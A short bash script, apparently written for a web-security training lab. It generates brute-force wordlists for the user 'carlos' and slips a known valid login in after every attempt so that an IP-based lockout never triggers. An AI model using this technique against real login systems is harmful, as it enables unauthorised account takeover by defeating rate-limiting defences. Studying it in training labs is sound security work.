#!/bin/bash

# Not a flexible script.

COUNTER=1
MAX=100
INTERVAL=$1

# Generate the custom wordlist for the user carlos
while (($COUNTER <= $MAX)); do
    echo "carlos" >> ./interval_usernames.txt
    let COUNTER=$COUNTER+1
done

# provide username
echo "$2" > username.txt
#provide password
echo "$3" > password.txt

# Append known valid username and passwords to the wordlists
# In order to bypass the IP block
awk '(FNR-1)%2 == 0 {getline add <"username.txt"; print add }; 1' interval_usernames.txt >> brute_usernames.txt
awk '(FNR-1)%2 == 0 {getline add <"password.txt"; print add }; 1' interval_passwords.txt >> brute_passwords.txt